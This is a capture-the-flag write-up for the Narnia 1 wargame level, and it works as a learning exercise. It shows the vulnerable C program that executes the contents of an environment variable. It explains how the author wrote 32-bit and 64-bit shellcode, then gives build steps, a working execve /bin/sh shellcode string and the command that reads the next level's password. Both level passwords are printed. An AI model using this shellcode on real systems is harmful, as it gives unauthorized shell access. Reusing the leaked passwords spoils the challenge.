# Narnia 1

Password: `efeidiedae`

Running /narnia/narnia1 gives the message `Give me something to execute at the env-variable EGG`

The source code for the problem is (no license, again):

```C
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

I attempted to build something sneaky [like this](./narnia01/failed-1.c) (compiled with gcc) but it didnt work. Ultimately a bit of research revealed that this is a shellcode problem: the goal is to place into the environment variable some text that is the hex encoding of legitimate machine code, so when the program casts it to a function, the function is valid.

Shellcode is the nickname for position-independent code, machine code that can be placed anywhere in memory and still function as intended. It needs to not depend on any stack variables, and to contain no null values (that is, to not contain the text `\x00`) so that it can function both as a full string and as machine code (the null value would prematurely terminate the string, ruining the shellcode).

While its entirely possible to grab some shellcode online (e.g. from the [shellcode database](http://shell-storm.org/shellcode/)), I took this as a learning challenge and decided to write my own.

First I tried doing so solely through C, [like this](./narnia01/failed-2.c), but couldn't get the output right. I was compiling using the command `gcc narnia01-shellcode.c -O0 -o shellcode` and dumping the assembly with `objdump -d shellcode`, but couldn't get rid of the null bytes - seemed to be some sort of optimisation I couldn't get rid of.

Next I tried with Assembly, but ran into a problem: none of the assembly I would write would work. It would always result in a seg fault. I thought it might be processor architecture, but when I tried to assemble on the narnia remote machine it would work and both the remote machine and my dev machines had the same x86-x64 architecture. Ultimately this turned out to be a quirk of WSL: the windows subsystem is 64 bit only - no 32 bit assembly at all. Linux 64 bit machines still allow 32 bit via compatibility. If I wrote valid 64 bit assembly it would work, and in theory 64 bit should work as well as 32 bit for my purposes. A challenge was that most tutorials use 32 bit, so I had to investigate how to do the translation. Fortunately its pretty easy: a different register layout (though the old registers are still there too) and `syscall` instead of int `$0x80`.

The next challenge was getting `execve` (the command that switches the current process with another) to run. The command takes three params, the second being an array and I struggled to get this working - bearing in mind I set myself a limit that I must write the code, and I must understand it. I could have just copied something, copied some assembly script, but I didn't want to do that. All the same, the final solution was a bit of a copout - it seems that linux doesn't actually require you to use execve properly, at least not in assembly: you can leave param two null and it works fine :) The first shell code I got working is [here in shellcode-64bit.asm](./narnia01/shellcode-64bit.asm), and was successfully tested in [this C testprog](./narnia01/testprog.c).

*However*, this also didn't work when used on the narnia program: while the shellcode worked fine whenever I used my own test programs, or even compiled nearly identical test programs on the remote host with the code injected in, it failed with narnia1. I got a mix of seg faults and illegal instructions - the former was probably just formatting mistakes, but the latter is more interesting and I eventually figured it out: while the machine is x86_64, the narnia1 executable *itself* is 32 bit. So I need 32 bit shellcode after all! 

With working 64 bit shellcode, getting 32 bit code was real easy: I created some [here in shellcode-32bit.asm](./narnia01/shellcode-32bit.asm) via a simple conversion (`int $0x80` instead of `syscall`, some different registers and constants being used).

## Steps to use exploit:

1. Copy or create a file called `shellcode.s` on the Narnia machine, containing the contents of [shellcode-32bit.asm](./narnia01/shellcode-32bit.asm)
2. Compile as a 32 bit executable via `gcc -m32 -nostdlib shellcode.s -o shellcode.so`
3. Use `objdump -d ./shellcode.so` to get the assembly dump.
4. Combine all machine code numbers (the second column of hex pairs) together sequentially with `\x` prefixing each.

    E.g. if the machine code is the lines `eb 0e`, `31 db`, `5b` then combined its `\xeb\x0e\x31\xdb\x5b`

5. Set the environment variable to the result using a command that parses escape sequences, e.g. on my run I used `echo -e` and the command was:

    `export EGG=$(echo -e "\xeb\x0e\x31\xdb\x5b\x31\xc9\x31\xd2\x31\xc0\x83\xc0\x0b\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")`

6. Run narnia1: `/narnia/narnia1`
7. All going well, you should get a shell. Run the command `cat /etc/narnia_pass/narnia2` to get the password for narnia2.

The password for narnia2 is **`nairiepecu`**.

Useful resources: 

- [Linux System Call Table for x86_64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
- [Linux System Call Table for 32bit](http://shell-storm.org/shellcode/files/syscalls.html)
- [NASM Tutorial](https://cs.lmu.edu/~ray/notes/nasmtutorial/)
- [GNU Assembler (GAS) Samples](https://cs.lmu.edu/~ray/notes/gasexamples/)
- [StackOverflow hint showing I was overengineering things](https://stackoverflow.com/a/46553481)
